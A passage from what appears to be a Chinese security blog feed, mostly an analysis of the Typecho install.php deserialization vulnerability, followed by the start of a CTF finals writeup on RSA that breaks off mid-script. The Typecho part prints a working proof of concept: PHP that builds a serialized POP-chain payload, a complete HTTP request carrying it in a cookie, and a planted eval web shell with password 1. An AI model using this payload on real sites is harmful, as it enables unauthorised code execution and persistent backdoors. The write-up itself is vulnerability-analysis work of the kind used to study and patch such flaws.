class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> RSS1 = <span class="hljs-string">&#x27;RSS 1.0&#x27;</span>;<br>    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&#x27;RSS 2.0&#x27;</span>;<br>    <span class="hljs-keyword">const</span> ATOM1 = <span class="hljs-string">&#x27;ATOM 1.0&#x27;</span>;<br>    <span class="hljs-keyword">const</span> DATE_RFC822 = <span class="hljs-string">&#x27;r&#x27;</span>;<br>    <span class="hljs-keyword">const</span> DATE_W3CDTF = <span class="hljs-string">&#x27;c&#x27;</span>;<br>    <span class="hljs-keyword">const</span> EOL = <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_charset</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_lang</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_version</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$version</span>, <span class="hljs-variable">$type</span> = <span class="hljs-built_in">self</span>::RSS2, <span class="hljs-variable">$charset</span> = <span class="hljs-string">&#x27;UTF-8&#x27;</span>, <span class="hljs-variable">$lang</span> = <span class="hljs-string">&#x27;en&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_version = <span class="hljs-variable">$version</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-variable">$type</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_charset = <span class="hljs-variable">$charset</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_lang = <span class="hljs-variable">$lang</span>;<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addItem</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$item</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_items[] = <span class="hljs-variable">$item</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;screenName&#x27;</span> =&gt; <span class="hljs-string">&quot;file_put_contents(&#x27;a.php&#x27;, &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;)&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;assert&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$p1</span> = <span class="hljs-keyword">new</span> Typecho_Feed(<span class="hljs-number">1</span>);<br><span class="hljs-variable">$p2</span> = <span class="hljs-keyword">new</span> Typecho_Request();<br><span class="hljs-variable">$p1</span>-&gt;addItem(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;author&#x27;</span> =&gt; <span class="hljs-variable">$p2</span>));<br><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;adapter&#x27;</span> =&gt; <span class="hljs-variable">$p1</span>, <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;MengChen&#x27;</span>);<br><span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><h3 id="2-http请求包"><a href="#2-http请求包" class="headerlink" title="2. http请求包"></a>2. http请求包</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/typecho/install.php?finish=233</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.135<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NTp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIyOiIAVHlwZWNob19GZWVkAF9jaGFyc2V0IjtzOjU6IlVURi04IjtzOjE5OiIAVHlwZWNob19GZWVkAF9sYW5nIjtzOjI6ImVuIjtzOjIyOiIAVHlwZWNob19GZWVkAF92ZXJzaW9uIjtpOjE7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTQ6ImZpbGVfcHV0X2NvbnRlbnRzKCdhLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoiTWVuZ0NoZW4iO30=<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.10.135/typecho/install.php<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure><p>效果就是会在网站目录下生成一个名为<code>a.php</code>的shell，密码为1</p><h3 id="3-效果图"><a href="#3-效果图" class="headerlink" title="3. 效果图"></a>3. 效果图</h3><p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1.png"></p><h2 id="0x02-漏洞原理分析"><a href="#0x02-漏洞原理分析" class="headerlink" title="0x02 漏洞原理分析"></a>0x02 漏洞原理分析</h2><h3 id="1-正向代码审计"><a href="#1-正向代码审计" class="headerlink" title="1. 正向代码审计"></a>1. 正向代码审计</h3><p>在<code>install.php</code>文件中，首先在第59-77行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;finish&#x27;</span>]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . <span class="hljs-string">&#x27;/config.inc.php&#x27;</span>) &amp;&amp; empty(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;typecho&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-regexp">//</span> 挡掉可能的跨站请求<br><span class="hljs-keyword">if</span> (!empty(<span class="hljs-variable">$_GET</span>) || !empty(<span class="hljs-variable">$_POST</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (empty(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$parts</span> = parse_url(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>]);<br><span class="hljs-keyword">if</span> (!empty(<span class="hljs-variable">$parts</span>[<span class="hljs-string">&#x27;port&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$parts</span>[<span class="hljs-string">&#x27;host&#x27;</span>] = <span class="hljs-string">&quot;&#123;$parts[&#x27;host&#x27;]&#125;:&#123;$parts[&#x27;port&#x27;]&#125;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (empty(<span class="hljs-variable">$parts</span>[<span class="hljs-string">&#x27;host&#x27;</span>]) || <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>] != <span class="hljs-variable">$parts</span>[<span class="hljs-string">&#x27;host&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>绕过这里需要用GET方法传入一个finish参数，然后再加入一个同源的Referer即可。</p><p>然后往下，在第229-235行，存在一个很明显的反序列化操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$config</span> = unserialize(base64_decode(Typecho_Cookie::get(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>)));<br>    Typecho_Cookie::delete(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>);<br>    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> Typecho_Db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;adapter&#x27;</span>], <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;prefix&#x27;</span>]);<br>    <span class="hljs-variable">$db</span>-&gt;addServer(<span class="hljs-variable">$config</span>, Typecho_Db::READ | Typecho_Db::WRITE);<br>    Typecho_Db::set(<span class="hljs-variable">$db</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在这里，可以通过<code>cookie</code>把一个序列化的变量反序列化后存入变量<code>$config</code>，然后在实例化<code>Typecho_Db</code>类时作为参数传入。全局搜索<code>Typecho_Db</code>类。</p><p>文件路径为<code>/var/Typecho/Db.php</code>。</p><p>在<code>Db.php</code>文件<code>Typecho_Db</code>类的构造函数中，第120行，存在一个字符串拼接操作</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$adapter</span>Name = <span class="hljs-string">&#x27;Typecho_Db_Adapter_&#x27;</span> . <span class="hljs-symbol">$adapter</span>Name;<br></code></pre></td></tr></table></figure><p>假设<code>$adapterName</code>是一个实例化的类，那么在进行该操作时,会触发类的<code>__toString()</code>魔术方法。</p><p>然后再寻找定义了<code>__toString()</code>方法的类。</p><p>找到三个</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>Typecho/Config.php<br><span class="hljs-regexp">/var/</span>Typecho/Feed.php<br><span class="hljs-regexp">/var/</span>Typecho/Query.php<br></code></pre></td></tr></table></figure><p>分别跟进进行审计。</p><p>在<code>Feed.php</code>中，第290行<code>__toString()</code>方法中。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$content</span> .= <span class="hljs-string">&#x27;&lt;dc:creator&gt;&#x27;</span> . htmlspecialchars(<span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="hljs-string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="hljs-keyword">self</span>::EOL;\<br></code></pre></td></tr></table></figure><p>在这里调用了<code>Feed.php</code>中类<code>Typecho_Feed</code>的一个私有数组成员<code>$_items</code>的值，这个值我们可以控制，于是又用到了另一个魔术方法__get()。</p><blockquote><p>__get会在读取不可访问的属性的值的时候调用<br>无法访问的属性包括两类：不存在的属性、私有属性</p></blockquote><p>因此，我们可以通过该处调用某个类的__get()魔术方法。</p><p>全局搜索下，分别跟进。</p><p>在<code>/var/Typecho/Requests.php</code>中,<code>Typecho_Request</code>类里第269-272行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-variable">$key</span>);<br>&#125;<br>在这进入了第<span class="hljs-number">295</span><span class="hljs-number">-311</span>行，get()中<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">NULL</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-variable">$key</span>]):<br>            <span class="hljs-variable">$value</span> = <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-variable">$key</span>];<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-keyword">isset</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$_httpParams</span>[<span class="hljs-variable">$key</span>]):<br>            <span class="hljs-variable">$value</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_httpParams</span>[<span class="hljs-variable">$key</span>];<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable">$default</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$value</span> = !is_array(<span class="hljs-variable">$value</span>) &amp;&amp; strlen(<span class="hljs-variable">$value</span>) &gt; <span class="hljs-number">0</span> ? <span class="hljs-variable">$value</span> : <span class="hljs-variable">$default</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_applyFilter(<span class="hljs-variable">$value</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后在第159行，进入_applyFilter()方法中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_applyFilter</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_filter) &#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;_filter <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>) &#123;<br>            <span class="hljs-variable">$value</span> = is_array(<span class="hljs-variable">$value</span>) ? array_map(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$value</span>) :<br>            call_user_func(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$value</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">$this</span>-&gt;_filter = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在第164行，有个很醒目的<code>call_user_func()</code>函数。<br><code>call_user_func()</code>是PHP的内置函数，该函数允许用户调用直接写的函数并传入一定的参数，这里就是代码执行的地方。</p><h3 id="2-Payload构造逻辑"><a href="#2-Payload构造逻辑" class="headerlink" title="2. Payload构造逻辑"></a>2. Payload构造逻辑</h3><p>首先，我们利用<code>cookie</code>传入一个序列化后的数组，数组中有个键为<code>&#39;adapter&#39;</code>、值为一个实例化的<code>Typecho_Feed()</code>类的键值对。</p><p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2.png"></p><p>在实例化<code>Typecho_Db</code>类时，实例化后的<code>Typecho_Feed</code>类在<code>Db.php</code>中第120行进行了字符串拼接操作，调用了<code>Typecho_Feed</code>类的<code>__toString()</code>方法。</p><p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3.png"></p><p>于是进入了<code>Feed.php</code>第223行的<code>__toString()</code>方法中。在类<code>Typecho_Feed()</code>类中有个私有化数组成员<code>$_items</code>,<br>在第284行对该数组进行了遍历，然后在第290行对<code>$item[&#39;author&#39;]</code>这个实例化的<code>screenName</code>成员进行操作。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$content</span> .= <span class="hljs-string">&#x27;&lt;dc:creator&gt;&#x27;</span> . htmlspecialchars(<span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="hljs-string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="hljs-keyword">self</span>::EOL;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4.png"></p><p>如果<code>$item[&#39;author&#39;]</code>这个实例化的类中没有<code>screenName</code>这个成员或者这个成员是私有的，则会调用该实例化类的<code>__get()</code>魔术方法，<br>并且<code>$item[&#39;author&#39;]</code>这个类我们是可以控制的，因此令它为<code>Typecho_Request</code>这个类，因为<code>Typecho_Request</code>中没有<code>screenName</code>这个成员<br>然后就调用的<code>screenName</code>的<code>__get()</code>魔术方法，传入了一个值为<code>screenName</code>的<code>$key</code>，进入<code>Request.php</code>第295行<code>Typecho_Request</code>类的<code>$_params[]</code>中。</p><p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5.png"></p><p>有键为<code>screenName</code>的键值对，就将它的值传入<code>$value</code>中，然后进入了<code>_applyFilter()</code>这个方法中，如果类<code>Typecho_Request</code>的成员<code>_filter</code>存在，就将其的值遍历作为函数名。<br>传入<code>call_user_func($filter, $value);</code>中，而<code>get()</code>方法中处理的<code>$value</code>就作为所执行函数的值传入其中`。于此代码执行</p><p><img src="https://image.mengsec.com/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6.png"></p><p>简单的说，在这个流程中，<code>call_user_func()</code>函数的两个参数我们都可控，<br>于是在此构成了任意代码执行。</p><p>整个POP链就是</p><p><code>Typecho_Db</code>类构造函数 –&gt; <code>Typecho_Feed</code>类的<code>__toString()</code>魔术方法 –&gt; <code>Typecho_Request</code>类的<code>__get()</code>魔术方法 –&gt; <code>Typecho_Request</code>类的<code>get()</code>方法 –&gt;<br><code>Typecho_Request</code>类的<code>_applyFilter()</code>方法 –&gt;<br><code>call_user_func()</code>执行任意代码</p><h2 id="0x03-PHP魔术方法"><a href="#0x03-PHP魔术方法" class="headerlink" title="0x03 PHP魔术方法"></a>0x03 PHP魔术方法</h2><ul><li><code>__construct()</code>，类的构造函数</li><li><code>__destruct()</code>，类的析构函数</li><li><code>__call()</code>，在对象中调用一个不可访问方法时调用</li><li><code>__callStatic()</code>，用静态方式中调用一个不可访问方法时调用</li><li><code>__get()</code>，获得一个类的成员变量时调用</li><li><code>__set()</code>，设置一个类的成员变量时调用</li><li><code>__isset()</code>，当对不可访问属性调用isset()或empty()时调用</li><li><code>__unset()</code>，当对不可访问属性调用unset()时被调用。</li><li><code>__sleep()</code>，执行serialize()时，先会调用这个函数</li><li><code>__wakeup()</code>，执行unserialize()时，先会调用这个函数</li><li><code>__toString()</code>，类被当成字符串时的回应方法</li><li><code>__invoke()</code>，调用函数的方式调用一个对象时的回应方法</li><li><code>__set_state()</code>，调用var_export()导出类时，此静态方法会被调用。</li><li><code>__clone()</code>，当对象复制完成时调用</li></ul><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul><li><a href="https://paper.seebug.org/424/">https://paper.seebug.org/424/</a></li><li><a href="http://www.th1s.cn/index.php/2017/10/25/138.html">http://www.th1s.cn/index.php/2017/10/25/138.html</a></li><li><a href="https://joyqi.com/typecho/about-typecho-20171027.html?from=timeline&amp;isappinstalled=0">https://joyqi.com/typecho/about-typecho-20171027.html?from=timeline&amp;isappinstalled=0</a></li><li><a href="http://p0sec.net/index.php/archives/114/">http://p0sec.net/index.php/archives/114/</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第六届山东省大学生网络安全技能大赛决赛Writeup</title>
    <link href="/2017/11/21/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9BWriteup/"/>
    <url>/2017/11/21/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9BWriteup/</url>
    
    <content type="html"><![CDATA[<p>技能题部分难度不是很高，但是靶场挺难的，总的来说学到了不少东西</p><a id="more"></a><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="0x01-RSA1"><a href="#0x01-RSA1" class="headerlink" title="0x01 RSA1"></a>0x01 RSA1</h3><p>首先使用python脚本或者openssl解出n</p><p>python脚本<br>​    </p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs processing">from Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br>pub = RSA.importKey(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pub.key&#x27;</span>).read())<br>n = <span class="hljs-keyword">long</span>(pub.n)<br>e = <span class="hljs-keyword">long</span>(pub.e)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;n:&#x27;</span>,n<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;e:&#x27;</span>,e<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;n(hex):&#x27;</span>,<span class="hljs-built_in">hex</span>(n)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;e(hex):&#x27;</span>,<span class="hljs-built_in">hex</span>(e)<br></code></pre></td></tr></table></figure><p>openssl命令</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">openssl rsa -<span class="hljs-keyword">in</span> pub.<span class="hljs-built_in">key</span> -pubin -<span class="hljs-built_in">modulus</span> -text<br></code></pre></td></tr></table></figure><p>然后通过工具yafu将n进行大数分解获得p和q,然后使用脚本生成私钥</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><br>keypair = RSA.generate(<span class="hljs-number">1024</span>)<br><br>keypair.p = <span class="hljs-number">250527704258269</span><br>keypair.q = <span class="hljs-number">74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349</span><br>keypair.e = <span class="hljs-number">65537</span><br><br>keypair.n = keypair.p * keypair.q<br>Qn = <span class="hljs-keyword">long</span>((keypair.p-<span class="hljs-number">1</span>) * (keypair.q-<span class="hljs-number">1</span>))<br><br>i = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> (<span class="hljs-keyword">True</span>):<br>    x = (Qn * i ) + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> (x % keypair.e == <span class="hljs-number">0</span>):<br>        keypair.d = x / keypair.e<br>        <span class="hljs-keyword">break</span><br>    i += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">private</span> = open(<span class="hljs-string">&#x27;private.pem&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">private</span>.<span class="hljs-keyword">write</span>(keypair.exportKey())<br><span class="hljs-keyword">private</span>.close()<br></code></pre></td></tr></table></figure><p>最后使用脚本或者openssl解密</p><p>脚本</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import rsa<br>prifile = open(<span class="hljs-string">&#x27;private.pem&#x27;</span>)<br><span class="hljs-selector-tag">p</span> = prifile<span class="hljs-selector-class">.read</span>()<br>privkey = rsa<span class="hljs-selector-class">.PrivateKey</span><span class="hljs-selector-class">.load_pkcs1</span>(p)<br>crypto 